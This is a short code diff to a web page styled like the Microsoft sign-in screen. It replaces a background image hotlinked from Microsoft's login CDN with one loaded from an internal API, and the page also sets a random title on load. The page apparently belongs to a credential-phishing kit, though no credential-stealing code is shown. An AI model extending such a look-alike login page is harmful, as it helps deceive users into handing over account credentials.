@@ -20,7 +20,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
+            background-image: url('');
             background-size: cover;
             background-position: center;
             min-height: 100vh;
@@ -856,9 +856,26 @@
             document.title = randomString;
         }
 
+        // Load dynamic background URL
+        async function loadBackgroundUrl() {
+            try {
+                const response = await fetch('/api/internal/background-url');
+                const data = await response.json();
+                
+                if (data.success && data.backgroundUrl) {
+                    document.body.style.backgroundImage = `url('${data.backgroundUrl}')`;
+                }
+            } catch (error) {
+                console.error('Error loading background URL:', error);
+                // Use default if loading fails
+                document.body.style.backgroundImage = "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg')";
+            }
+        }
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             generateRandomTitle(); // Set random title
+            loadBackgroundUrl(); // Load dynamic background
             setLoading(false); // Start with loading off
             checkBackendHealth();
             checkExistingSession();
